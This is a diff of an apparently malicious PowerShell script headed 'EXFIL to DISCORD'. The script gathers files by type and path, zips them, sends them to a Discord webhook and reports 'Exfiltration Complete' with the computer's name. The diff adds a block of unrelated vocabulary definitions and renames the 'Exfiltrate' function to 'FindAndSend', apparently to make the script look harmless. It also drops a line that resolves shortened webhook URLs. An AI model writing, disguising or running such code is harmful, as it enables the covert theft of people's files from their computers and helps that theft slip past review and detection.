@@ -1,10 +1,38 @@
+<# ============================================ EXFIL to DISCORD =================================================
 
+Ablaze – On fire; brightly burning with intensity.
+
+Banter – Playful, teasing talk between close friends.
+
+Crisp – Firm, dry, and easily breakable texture.
+
+Dapper – Stylish, neat man with elegant appearance.
+
+Elicit – Draw out a response or reaction.
+
+Fathom – Understand something deeply, often abstractly.
+
+Glimpse – Quick, brief look without full details.
+
+Havoc – Widespread destruction; total chaos and disorder.
+
+Imbue – Fill or inspire with certain feelings.
+
+Jovial – Cheerful, friendly, full of good humor.
+
+Keen – Sharp, eager, or intellectually perceptive mind.
+
+Lurk – Remain hidden, waiting to spring forth.
+
+Mirth – Amusement expressed through laughter or cheerfulness.
+
+Nimble – Quick and light in movement or action.
+
+#>
 
 $hookurl = "$dc"
-# shortened URL Detection
-if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}
 
-Function Exfiltrate {
+Function FindAndSend {
 
 param ([string[]]$FileType,[string[]]$Path)
 $maxZipFileSize = 10MB
@@ -54,4 +82,4 @@ Remove-Item -Path $zipFilePath -Force
 Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
 }
 
-Exfiltrate
+FindAndSend 
